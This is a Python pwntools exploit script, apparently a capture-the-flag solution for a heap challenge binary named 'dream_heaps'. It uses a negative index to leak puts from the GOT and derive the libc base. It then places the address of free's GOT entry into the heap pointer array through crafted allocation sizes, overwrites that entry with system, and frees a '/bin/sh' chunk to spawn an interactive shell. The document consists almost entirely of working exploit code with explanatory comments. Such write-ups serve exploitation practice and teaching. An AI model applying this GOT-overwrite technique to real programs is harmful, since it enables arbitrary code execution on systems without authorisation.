from pwn import *

gdbcmds = '''
b *main+196
b *edit_dream+137
b *main+201
r
'''
elf = context.binary = ELF('./dream_heaps')
libc = elf.libc
target = process('./dream_heaps')
#target = gdb.debug('./dream_heaps', gdbscript=gdbcmds)

def write(message, length):
    target.recvuntil(b">")
    target.sendline(b"1")
    target.recvuntil(b"?")
    target.sendline(length)
    target.recvuntil(b"?")
    target.sendline(message)

def read(idx):
    target.recvuntil(b">")
    target.sendline(b"2")
    target.recvuntil(b"?")
    target.sendline(idx)
    leak = target.recvuntil(b"What")
    leak = leak.replace(b"What", b"")
    leak = leak.replace(b"\x0a", b"")
    leak += (8-len(leak))*b"\x00"
    leak = u64(leak)
    return leak


def edit(message, idx):
    target.recvuntil(b">")
    target.sendline(b"3")
    target.recvuntil(b"?")
    target.sendline(idx)
    target.send(message)


def delete(idx):
    target.recvuntil(b">")
    target.sendline(b"4")
    target.recvuntil(b"?")
    target.sendline(idx)

'''
read_dreams will dereference the pointer 0x400538
Becomes 0x602020 
Prints contents at 0x602020
Which is for example 0x7ffff7a649c0, address of puts in libc
'''
leak = read(b"-263021")
base = leak - libc.symbols['puts'] 
print("Leak:", hex(leak))
print("Base:", hex(base))

'''
addr of free is at 0x602018 in GOT
writes 0x602018 to the array that heap_pointers points to
when we call edit, we overwrite the content at 0x602018
with the addr of system
'''
write(b'/bin/sh\x00', b'16')
write(b'0'*10, b'10')
write(b'0'*10, b'10')
write(b'0'*10, b'10')
write(b'0'*10, b'10')
write(b'0'*10, b'10')
write(b'0'*10, b'10')
write(b'0'*10, b'10')
write(b'0'*10, b'10')
write(b'0'*10, b'10')
write(b'0'*10, b'10')
write(b'0'*10, b'10')
write(b'0'*10, b'10')
write(b'0'*10, b'10')
write(b'0'*10, b'10')
write(b'0'*10, b'10')
write(b'0'*10, b'10')
write(b'0'*10, b'24')
write(b'0'*10, b'6299672')
write(b'0'*10, b'00')

sys = p64(base + libc.symbols['system'])
edit(sys, b"17")

delete(b'0')

target.interactive()
